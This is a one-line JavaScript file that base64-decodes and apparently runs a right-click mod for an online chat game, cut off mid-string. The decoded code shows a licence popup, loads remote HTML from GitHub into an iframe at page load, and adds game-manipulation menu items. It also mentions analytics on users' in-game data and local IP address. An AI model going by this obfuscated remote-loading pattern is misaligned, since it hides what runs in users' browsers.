var sprc = atob('Ly8gTGljZW5zZSBBZ2dyZWVtZW50IHByb21wdF9fX19fX19fX19fX19fX19fX19fX18KCmNvbnN0IHBvcHVwQ29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7CnBvcHVwQ29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gJ2ZpeGVkJzsKcG9wdXBDb250YWluZXIuc3R5bGUudG9wID0gJzAnOwpwb3B1cENvbnRhaW5lci5zdHlsZS5sZWZ0ID0gJzAnOwpwb3B1cENvbnRhaW5lci5zdHlsZS53aWR0aCA9ICcxMDB2dyc7CnBvcHVwQ29udGFpbmVyLnN0eWxlLmhlaWdodCA9ICcxMDB2aCc7CnBvcHVwQ29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICdyZ2JhKDAsIDAsIDAsIDAuNSknOwpwb3B1cENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOwpwb3B1cENvbnRhaW5lci5zdHlsZS5qdXN0aWZ5Q29udGVudCA9ICdjZW50ZXInOwpwb3B1cENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gJ2NlbnRlcic7CnBvcHVwQ29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICc5OTk5JzsKCmNvbnN0IHBvcHVwQ29udGVudCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwpwb3B1cENvbnRlbnQuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gJyNmZmYnOwpwb3B1cENvbnRlbnQuc3R5bGUuYm9yZGVyUmFkaXVzID0gJzVweCc7CnBvcHVwQ29udGVudC5zdHlsZS5wYWRkaW5nID0gJzJyZW0nOwpwb3B1cENvbnRlbnQuc3R5bGUud2lkdGggPSAnODAlJzsKcG9wdXBDb250ZW50LnN0eWxlLm1heFdpZHRoID0gJzYwMHB4JzsKcG9wdXBDb250ZW50LnN0eWxlLnRleHRBbGlnbiA9ICdjZW50ZXInOwoKLy8gQkNNRSBsb2dvCmNvbnN0IGxvZ28gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbWcnKTsKbG9nby5zcmMgPSAnaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5JzsKbG9nby5zdHlsZS53aWR0aCA9ICcxMDBweCc7CmxvZ28uc3R5bGUuaGVpZ2h0ID0gJzEwMHB4JzsKcG9wdXBDb250ZW50LmFwcGVuZENoaWxkKGxvZ28pOwoKY29uc3Qgd2VsY29tZU1lc3NhZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdoMicpOwp3ZWxjb21lTWVzc2FnZS5pbm5lclRleHQgPSAnV2VsY29tZSB0byBCQ01FLCBUaGUgRmlyc3QgUmlnaHQgQ2xpY2sgQkMgRXh0ZW5zaW9uJzsKcG9wdXBDb250ZW50LmFwcGVuZENoaWxkKHdlbGNvbWVNZXNzYWdlKTsKCmNvbnN0IGluc3RydWN0aW9uTWVzc2FnZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3AnKTsKaW5zdHJ1Y3Rpb25NZXNzYWdlLmlubmVyVGV4dCA9ICdBY2NlcHQgb3VyIExpY2Vuc2UgQWdyZWVtZW50IGFuZCBQcml2YWN5IFBvbGljeSBiZWxvdyB0byBnZXQgc3RhcnRlZCc7CnBvcHVwQ29udGVudC5hcHBlbmRDaGlsZChpbnN0cnVjdGlvbk1lc3NhZ2UpOwoKY29uc3QgYnV0dG9uc0NvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwpidXR0b25zQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7CmJ1dHRvbnNDb250YWluZXIuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAnc3BhY2UtYmV0d2Vlbic7Cgpjb25zdCBsZWFybk1vcmVCdXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdhJyk7CmxlYXJuTW9yZUJ1dHRvbi5ocmVmID0gJ2h0dHBzOi8vYmNtLnNpdGUubGl2ZS9iY21sLyc7CmxlYXJuTW9yZUJ1dHRvbi50YXJnZXQgPSAnX2JsYW5rJzsKbGVhcm5Nb3JlQnV0dG9uLmlubmVyVGV4dCA9ICdMZWFybiBNb3JlJzsKbGVhcm5Nb3JlQnV0dG9uLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICcjMDA3YmZmJzsKbGVhcm5Nb3JlQnV0dG9uLnN0eWxlLmNvbG9yID0gJyNmZmYnOwpsZWFybk1vcmVCdXR0b24uc3R5bGUucGFkZGluZyA9ICcwLjVyZW0gMXJlbSc7CmxlYXJuTW9yZUJ1dHRvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAnM3B4JzsKbGVhcm5Nb3JlQnV0dG9uLnN0eWxlLnRleHREZWNvcmF0aW9uID0gJ25vbmUnOwpidXR0b25zQ29udGFpbmVyLmFwcGVuZENoaWxkKGxlYXJuTW9yZUJ1dHRvbik7Cgpjb25zdCBjaGVja2JveENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2xhYmVsJyk7CmNoZWNrYm94Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7CmNoZWNrYm94Q29udGFpbmVyLnN0eWxlLmFsaWduSXRlbXMgPSAnY2VudGVyJzsKY2hlY2tib3hDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICcwLjVyZW0gMXJlbSc7CmNoZWNrYm94Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICc1MHB4JzsKY2hlY2tib3hDb250YWluZXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gJyNmZmYnOwpjaGVja2JveENvbnRhaW5lci5zdHlsZS5ib3hTaGFkb3cgPSAnMHB4IDBweCA1cHggI2JiYic7CmNoZWNrYm94Q29udGFpbmVyLnN0eWxlLmN1cnNvciA9ICdwb2ludGVyJzsKCmNvbnN0IGNoZWNrYm94SW5wdXQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpOwpjaGVja2JveElucHV0LnR5cGUgPSAnY2hlY2tib3gnOwpjaGVja2JveElucHV0LmNoZWNrZWQgPSBmYWxzZTsgCmNoZWNrYm94SW5wdXQuc3R5bGUubWFyZ2luUmlnaHQgPSAnMC41cmVtJzsKY2hlY2tib3hJbnB1dC5vbmNoYW5nZSA9ICgpID0+IHsKICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgnb3B0QW5hbHl0aWNzJywgY2hlY2tib3hJbnB1dC5jaGVja2VkKTsKfTsKY2hlY2tib3hDb250YWluZXIuYXBwZW5kQ2hpbGQoY2hlY2tib3hJbnB1dCk7Cgpjb25zdCBjaGVja2JveFRleHQgPSBkb2N1bWVudC5jcmVhdGVUZXh0Tm9kZSgnTGltaXRlZCBBbmFseXRpY3MnKTsKCmNvbnN0IGluZm9JY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc3BhbicpOwppbmZvSWNvbi5pbm5lckhUTUwgPSAnJiM5NDMyOyc7CmluZm9JY29uLnN0eWxlLmZvbnRTaXplID0gJzFyZW0nOwppbmZvSWNvbi5zdHlsZS5jdXJzb3IgPSAncG9pbnRlcic7CmluZm9JY29uLnN0eWxlLm1hcmdpbkxlZnQgPSAnNXB4JzsgCmluZm9JY29uLnRpdGxlID0gJ0VuaGFuY2VkIHByaXZhY3kgYnkgbGltaXRpbmcgYW5hbHl0aWNzIHRyYWNraW5nIHN1Y2ggYXMgbW9uZXksIGZvbnQsIGNoYXQgY29sb3IgdGhlbWUsIGFyb3VzYWwgcHJvZ3Jlc3MgYW5kIGxvY2FsIElQIGFkZHJlc3MnOwoKY2hlY2tib3hDb250YWluZXIuYXBwZW5kQ2hpbGQoY2hlY2tib3hUZXh0KTsKY2hlY2tib3hDb250YWluZXIuYXBwZW5kQ2hpbGQoaW5mb0ljb24pOwoKYnV0dG9uc0NvbnRhaW5lci5hcHBlbmRDaGlsZChjaGVja2JveENvbnRhaW5lcik7Cgpjb25zdCBhY2NlcHRCdXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdidXR0b24nKTsKYWNjZXB0QnV0dG9uLmlubmVyVGV4dCA9ICdBY2NlcHQgJiBDb250aW51ZSc7CmFjY2VwdEJ1dHRvbi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAnIzI4YTc0NSc7CmFjY2VwdEJ1dHRvbi5zdHlsZS5jb2xvciA9ICcjZmZmJzsKYWNjZXB0QnV0dG9uLnN0eWxlLmJvcmRlciA9ICdub25lJzsKYWNjZXB0QnV0dG9uLnN0eWxlLnBhZGRpbmcgPSAnMC41cmVtIDFyZW0nOwphY2NlcHRCdXR0b24uc3R5bGUuYm9yZGVyUmFkaXVzID0gJzNweCc7CmFjY2VwdEJ1dHRvbi5zdHlsZS5jdXJzb3IgPSAncG9pbnRlcic7CmFjY2VwdEJ1dHRvbi5vbmNsaWNrID0gKCkgPT4gewogIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCdiY21lLWFjY2VwdGVkJywgJ3RydWUnKTsKICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKHBvcHVwQ29udGFpbmVyKTsKfTsKYnV0dG9uc0NvbnRhaW5lci5hcHBlbmRDaGlsZChhY2NlcHRCdXR0b24pOwoKcG9wdXBDb250ZW50LmFwcGVuZENoaWxkKGJ1dHRvbnNDb250YWluZXIpOwoKcG9wdXBDb250YWluZXIuYXBwZW5kQ2hpbGQocG9wdXBDb250ZW50KTsKCmlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnYmNtZS1hY2NlcHRlZCcpICE9PSAndHJ1ZScpIHsKICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHBvcHVwQ29udGFpbmVyKTsKfQoKaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdvcHRBbmFseXRpY3MnKSA9PT0gJ3RydWUnKSB7CiAgY2hlY2tib3hJbnB1dC5jaGVja2VkID0gdHJ1ZTsKfQoKCi8vUGVyaW9kaWNhbCBEZWJ1Z19fX19fX19fX19fX19fX19fX19fX18KCi8vV0lQCgovL0VuZCBPZiBEZWJ1Z19fX19fX19fX19fX19fX19fX19fX18KCgovL1N0YXJ0IE9mIExvYWRpbmcgU2NyZWVuX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KY29uc3QgaHRtbEZpbGVVcmwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JDTVM3L0JDTS0vbWFpbi9sb2FkaW5nNCc7CmZldGNoKGh0bWxGaWxlVXJsKQogIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKICAudGhlbihodG1sID0+IHsKICAgIGNvbnN0IGlmcmFtZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpOwogICAgaWZyYW1lLnN0eWxlLnBvc2l0aW9uID0gJ2ZpeGVkJzsKICAgIGlmcmFtZS5zdHlsZS50b3AgPSAnMCc7CiAgICBpZnJhbWUuc3R5bGUubGVmdCA9ICcwJzsKICAgIGlmcmFtZS5zdHlsZS53aWR0aCA9ICcxMzglJzsKICAgIGlmcmFtZS5zdHlsZS5oZWlnaHQgPSAnMTI1JSc7CiAgICBpZnJhbWUuc3R5bGUubWFyZ2luTGVmdCA9ICctMTklJzsgCiAgICBpZnJhbWUuc3R5bGUubWFyZ2luVG9wID0gJy0yJSc7IAogICAgaWZyYW1lLm9ubG9hZCA9IGZ1bmN0aW9uKCkgewogICAgICBjb25zdCBpZnJhbWVEb2N1bWVudCA9IHRoaXMuY29udGVudFdpbmRvdy5kb2N1bWVudDsKICAgICAgaWZyYW1lRG9jdW1lbnQub3BlbigpOwogICAgICBpZnJhbWVEb2N1bWVudC53cml0ZShodG1sKTsKICAgICAgaWZyYW1lRG9jdW1lbnQuY2xvc2UoKTsKICAgIH07CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGlmcmFtZSk7CnNldFRpbWVvdXQoKCkgPT4gewogIGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQoaWZyYW1lKTsKfSwgNzAwMCk7CiAgfSkKICAuY2F0Y2goZXJyb3IgPT4gewogICAgY29uc29sZS5lcnJvcignRXJyb3IgaW1wb3J0aW5nIEhUTUw6JywgZXJyb3IpOwogIH0pOwoKCi8vRW5kIE9mIExvYWRpbmcgU2NyZWVuIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgpmZXRjaCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JDTVM3L0JDTS9tYWluL3NlcnZlcm1haW50YWluYW5jZScpCiAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQogIC50aGVuKGRhdGEgPT4gewogICAgY29uc3QgcmVnZXggPSAvXGQrLzsKICAgIGNvbnN0IG1hdGNoID0gZGF0YS5tYXRjaChyZWdleCk7CiAgICBpZiAobWF0Y2ggJiYgcGFyc2VJbnQobWF0Y2hbMF0pID49IDEpIHsKICAgICAgZnVuY3Rpb24gc2hvd1RvYXN0TWFpbnQoKSB7CiAgICAgICAgdmFyIHRvYXN0Q29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvdHRvbSA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnJpZ2h0ID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIndoaXRlIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5jb2xvciA9ICIjMTQxNDE0IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wYWRkaW5nID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCAjZjIyYzJjIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3hTaGFkb3cgPSAiMnB4IDJweCAxMHB4IHJnYmEoMCwgMCwgMCwgMC41KSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS56SW5kZXggPSAiOTk5IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC41cyBlYXNlLWluLW91dCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKICAgICAgICB2YXIgc3RhdHVzQmFyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICBzdGF0dXNCYXIuc3R5bGUuaGVpZ2h0ID0gIjNweCI7CiAgICBzdGF0dXNCYXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImJsYWNrIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CiAgICBzdGF0dXNCYXIuc3R5bGUuYm90dG9tID0gIjAiOwogICAgc3RhdHVzQmFyLnN0eWxlLmxlZnQgPSAiMCI7CiAgICBzdGF0dXNCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICJ3aWR0aCA1cyBlYXNlLWluLW91dCI7CiAgICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMCUiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoc3RhdHVzQmFyKTsKICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgIH0sIDApOwogICAgICAgIAp2YXIgY2xvc2VCdXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJidXR0b24iKTsKY2xvc2VCdXR0b24uc3R5bGUuYm9yZGVyID0gIm5vbmUiOwpjbG9zZUJ1dHRvbi5zdHlsZS5iYWNrZ3JvdW5kID0gIm5vbmUiOwpjbG9zZUJ1dHRvbi5zdHlsZS50b3AgPSAiNXB4IjsKY2xvc2VCdXR0b24uc3R5bGUucmlnaHQgPSAiNXB4IjsKY2xvc2VCdXR0b24uc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKY2xvc2VCdXR0b24uc3R5bGUuZm9udFNpemUgPSAiMTZweCI7CmNsb3NlQnV0dG9uLnN0eWxlLm1hcmdpbkxlZnQgPSAiLTJweCI7CmNsb3NlQnV0dG9uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIjBweCI7CmNsb3NlQnV0dG9uLmlubmVySFRNTCA9ICJYIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoY2xvc2VCdXR0b24pOwoKY2xvc2VCdXR0b24uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogIH0sIDUwMCk7Cn0pOwoKICAgIC8vIEJDTSBMb2dvIEljb24KICAgIHZhciBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICBpY29uLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwogICAgaWNvbi5zdHlsZS53aWR0aCA9ICIyM3B4IjsKICAgIGljb24uc3R5bGUuaGVpZ2h0ID0gIjIzcHgiOwogICAgaWNvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKICAgIGljb24uc3R5bGUubWFyZ2luUmlnaHQgPSAiLTMwcHgiOwogICAgaWNvbi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiLTVweCI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChpY29uKTsKICAgIAogICAgLy8gTWFpbnRlbmFuY2UgVGV4dAogICAgdmFyIHRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzcGFuIik7CiAgICB0ZXh0LnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CiAgICB0ZXh0LnN0eWxlLm1hcmdpbkxlZnQgPSAiMzVweCI7CiAgICB0ZXh0LmlubmVySFRNTCA9ICJCQ01FIHNlcnZlcnMgYXJlIHVuZGVyIG1haW50YWluYW5jZSwgdHJ5IGFnYWluIGxhdGVyIjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHRleHQpOwoKICAgICAgCiAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh0b2FzdENvbnRhaW5lcik7CiAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjEiOwogICAgICAgfSwgMCk7CiAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgICAgIH0sIDUwMDAwMDApOwogICAgICAKICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgIH0sIDU1MDAwMDApOwogICAgICB9IAogICAgc2hvd1RvYXN0TWFpbnQoKTsgICAgIAogICAgIHRocm93IG5ldyBFcnJvcignRXhlY3V0aW9uIHN0b3BwZWQuJyk7IAogICAgfSBlbHNlIHsKCgovL1N0YXJ0IE9mIENvbnRleHQgTWVudV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgovL0Rlc2t0b3AgTWVudV9fX19fX19fX19fX19fX19fX19fX19fCnZhciB2aXNiID0gdHJ1ZTsKdmFyIGNvbnRleHRNZW51T3BlbiA9IGZhbHNlOwpmdW5jdGlvbiBjcmVhdGVCdXR0b24odGV4dCwgb25DbGljaykgewogICAgIGNvbnRleHRNZW51T3BlbiA9IHRydWU7CiAgICB2YXIgYnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBidXR0b24uaW5uZXJIVE1MID0gdGV4dDsKICAgIGJ1dHRvbi5vbmNsaWNrID0gb25DbGljazsKICAgIGJ1dHRvbi5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgIGJ1dHRvbi5zdHlsZS50ZXh0QWxpZ24gPSAibGVmdCI7CiAgICBidXR0b24uc3R5bGUucGFkZGluZyA9ICI1cHgiOwogICAgYnV0dG9uLnN0eWxlLmN1cnNvciA9ICJwb2ludGVyIjsKICAgIHJldHVybiBidXR0b247Cn0KCmZ1bmN0aW9uIGNyZWF0ZVNlcGFyYXRvcigpIHsKICAgIHZhciBzZXBhcmF0b3IgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJociIpOwogICAgc2VwYXJhdG9yLnN0eWxlLm1hcmdpbiA9ICI1cHggMCI7CiAgICByZXR1cm4gc2VwYXJhdG9yOwp9CgovLyBGdW5jdGlvbiB0byBkaXNwbGF5IGN1c3RvbSBjb250ZXh0IG1lbnVfX19fXwpsZXQgY29udGV4dE1lbnVUaW1lciA9IG51bGw7CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNvbnRleHRtZW51IiwgZnVuY3Rpb24oZXZlbnQpIHsKICBpZiAoY29udGV4dE1lbnVPcGVuKSB7CiAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwogICAgcmV0dXJuOyAvLyBQcmV2ZW50IGR1cGUgbWVudXMKICB9CiAgaWYgKHdpbmRvdy5nZXRTZWxlY3Rpb24oKS50b1N0cmluZygpICE9PSAnJykgewogICAgLy8gU2hvdyByZWd1bGFyIGNvbnRleHQgbWVudSB3aGVuIHRleHQgaXMgaGlnaGxpZ2h0ZWQKICAgIHJldHVybjsKICB9CiAgZXZlbnQucHJldmVudERlZmF1bHQoKTsKICB2YXIgY29udGV4dE1lbnUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICBjb250ZXh0TWVudS5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgY29udGV4dE1lbnUuc3R5bGUuYmFja2dyb3VuZCA9ICJsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCB3aGl0ZSwgd2hpdGUpIjsKICBjb250ZXh0TWVudS5zdHlsZS5ib3hTaGFkb3cgPSAiMCAwIDNweCAjOTk5IjsKICBjb250ZXh0TWVudS5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiOHB4IjsKICBjb250ZXh0TWVudS5zdHlsZS56SW5kZXggPSAiOTk5OSI7CiAgY29udGV4dE1lbnUuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCBibGFjayI7CiAgY29udGV4dE1lbnVPcGVuID0gdHJ1ZTsKICBpZiAoJ29udG91Y2hzdGFydCcgaW4gd2luZG93KSB7CiAgICAvLyBIYW5kbGUgbG9uZyBwcmVzcyBvbiBtb2JpbGUgZGV2aWNlcwogICAgY29udGV4dE1lbnVUaW1lciA9IHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIGNvbnRleHRNZW51LnN0eWxlLnRvcCA9IGV2ZW50LnRvdWNoZXNbMF0uY2xpZW50WSArICJweCI7CiAgICAgIGNvbnRleHRNZW51LnN0eWxlLmxlZnQgPSBldmVudC50b3VjaGVzWzBdLmNsaWVudFggKyAicHgiOwogICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNvbnRleHRNZW51KTsKICAgICAgY29udGV4dE1lbnVPcGVuID0gdHJ1ZTsKICAgIH0sIDUwMCk7CiAgfSBlbHNlIHsKICAgIC8vIEhhbmRsZSByaWdodCBjbGljayBvbiBkZXNrdG9wIGRldmljZXMKICAgIGNvbnRleHRNZW51LnN0eWxlLnRvcCA9IGV2ZW50LmNsaWVudFkgKyAicHgiOwogICAgY29udGV4dE1lbnUuc3R5bGUubGVmdCA9IGV2ZW50LmNsaWVudFggKyAicHgiOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChjb250ZXh0TWVudSk7CiAgICBjb250ZXh0TWVudU9wZW4gPSB0cnVlOwogIH0KICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkgewogICAgY29udGV4dE1lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIGNvbnRleHRNZW51T3BlbiA9IGZhbHNlOwogICAgY2xlYXJUaW1lb3V0KGNvbnRleHRNZW51VGltZXIpOwogIH0pOwogICAgCgoKICAgIC8vIEhlYWRlciB3aXRoIEJDTSBsb2dvCiAgICB2YXIgaGVhZGVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBoZWFkZXIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICAgIGhlYWRlci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CiAgICBoZWFkZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwoKICAgIHZhciBwcm9maWxlUGhvdG8gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICAgIHByb2ZpbGVQaG90by5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKICAgIHByb2ZpbGVQaG90by5zdHlsZS53aWR0aCA9ICIzMHB4IjsKICAgIHByb2ZpbGVQaG90by5zdHlsZS5oZWlnaHQgPSAiMzBweCI7CiAgICBwcm9maWxlUGhvdG8uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjIwJSI7CiAgICBwcm9maWxlUGhvdG8uc3R5bGUubWFyZ2luUmlnaHQgPSAiMTBweCI7CgogICAgdmFyIGhlYWRlclRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIGhlYWRlclRleHQuaW5uZXJIVE1MID0gIjxiPkVzc2VudGlhbHM8L2I+IjsKCiAgICBoZWFkZXIuYXBwZW5kQ2hpbGQocHJvZmlsZVBob3RvKTsKICAgIGhlYWRlci5hcHBlbmRDaGlsZChoZWFkZXJUZXh0KTsKCiAvLyBDdXN0b20gbWFpbiBidXR0b25zCiB2YXIgYnV0dG9uMSA9IGNyZWF0ZUJ1dHRvbigiUmVzdG9yZSBDaGFyYWN0ZXIiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6UGxheWVyLkFwcGVhcmFuY2UgPSBDaGF0U2VhcmNoU2FmZXdvcmRBcHBlYXJhbmNlLnNsaWNlKDApOyAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOyAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIAp9KTsKdmFyIGJ1dHRvbjIgPSBjcmVhdGVCdXR0b24oIkZvcmNlIFJvb20gU3dhcCIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpDaGF0U2VsZWN0U3RhcnRTZWFyY2goJ1gnKSxDaGF0Um9vbVNldExhc3RDaGF0Um9vbSgnJyksZG9jdW1lbnRbJ2dldEVsZW1lbnRCeUlkJ10oJ0lucHV0Q2hhdCcpWydzdHlsZSddWydkaXNwbGF5J109J25vbmUnLGRvY3VtZW50WydnZXRFbGVtZW50QnlJZCddKCdUZXh0QXJlYUNoYXRMb2cnKVsnc3R5bGUnXVsnZGlzcGxheSddPSdub25lJyxDaGF0U2VsZWN0U3RhcnRTZWFyY2goJ1gnKSxDaGF0Um9vbVNldExhc3RDaGF0Um9vbSgnJyk7CiAgICBzaG93VG